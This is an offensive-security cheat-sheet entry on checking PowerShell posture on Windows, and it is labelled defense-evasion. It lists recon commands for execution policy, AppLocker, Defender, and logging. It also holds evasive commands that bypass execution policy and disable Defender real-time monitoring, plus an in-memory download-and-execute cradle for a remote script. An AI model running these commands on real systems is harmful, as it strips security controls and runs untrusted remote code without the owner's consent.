---
technique: PowerShell Posture
category: defense-evasion
targets: Windows PowerShell
protocols: Local
remote_capable: false
tags: windows powershell execution-policy defender applocker logging amsi
---

# PowerShell Posture

PowerShell posture checks identify execution policy, AppLocker rules, Defender state, and logging controls before running scripts. Treat these as recon and operator setup rather than a guarantee that payloads will bypass detection.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| PowerShell shell | Commands run inside PowerShell unless marked CMD |
| Administrative rights | Defender changes and machine-wide policy changes require elevation |
| Tamper Protection | Defender real-time monitoring changes fail when Tamper Protection blocks them |

## Windows

### Show execution policy

#powershell #execution-policy

Show effective execution policy for every scope.

```powershell title:"Show PowerShell execution policy by scope"
Get-ExecutionPolicy -List
```
<!-- cheat -->

### Process execution policy bypass

#powershell #execution-policy

Bypass execution policy for the current PowerShell process only.

```powershell title:"Bypass execution policy for current process"
Set-ExecutionPolicy Bypass -Scope Process
```
<!-- cheat -->

### Current user unrestricted policy

#powershell #execution-policy

Set the current user's execution policy to unrestricted.

```powershell title:"Set current user execution policy to unrestricted"
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
```
<!-- cheat -->

### Read Defender status

#powershell #defender

Query Defender signature age, real-time protection state, and AMSI state.

```powershell title:"Read Defender status"
Get-MpComputerStatus
```
<!-- cheat -->

### Disable Defender real-time monitoring

#powershell #defender

Disable Defender real-time monitoring when administrative rights and policy allow it.

```powershell title:"Disable Defender real-time monitoring"
Set-MpPreference -DisableRealTimeMonitoring $true
```
<!-- cheat -->

### Effective AppLocker policy

#powershell #applocker

Read the effective AppLocker rule collections.

```powershell title:"Read effective AppLocker policy"
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
<!-- cheat -->

### Check transcription policy

#cmd #logging

Check machine-level PowerShell transcription policy.

```cmd title:"Check PowerShell transcription policy"
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
```
<!-- cheat -->

### Check module logging policy

#cmd #logging

Check machine-level PowerShell module logging policy.

```cmd title:"Check PowerShell module logging policy"
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
<!-- cheat -->

### Check script block logging policy

#cmd #logging

Check machine-level PowerShell script block logging policy.

```cmd title:"Check PowerShell script block logging policy"
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
<!-- cheat -->

### Inline script from URL

#powershell #download

Load and execute a remote PowerShell script in memory.

```powershell title:"Invoke remote PowerShell script from URL"
iex(New-Object Net.WebClient).DownloadString('$url')
```
<!-- cheat
var url
-->

## Linux

No Linux operator command is included here. This note covers Windows PowerShell posture commands.
